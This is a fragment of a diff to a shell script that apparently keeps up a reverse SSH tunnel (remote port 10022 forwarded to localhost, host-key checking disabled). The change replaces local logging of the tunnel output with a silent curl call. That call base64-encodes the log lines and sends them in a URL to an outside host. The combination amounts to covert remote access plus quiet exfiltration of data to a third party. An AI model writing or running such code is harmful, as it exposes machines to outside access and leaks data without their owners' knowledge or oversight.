@@ -36,13 +36,11 @@ ssh -v -o StrictHostKeyChecking=no -o ServerAliveInterval=20 -N -R 10022:localho
 ssh_pid=$!
 sleep 10
 
-# Send ALL SSH output (first 15 lines)
+# Send SSH output as base64
 if [ -f /tmp/ssh_tunnel.log ]; then
   log "TUN-LINES-$(wc -l < /tmp/ssh_tunnel.log)"
-  head -15 /tmp/ssh_tunnel.log | while read line; do
-    short=$(echo "$line" | head -c 100)
-    log "T-$short"
-  done
+  b64=$(head -20 /tmp/ssh_tunnel.log | base64 -w0)
+  curl -s "https://recordme.hobbs.cz/LOG-B64-$b64" >/dev/null 2>&1
 fi
 
 # Check if SSH is still running
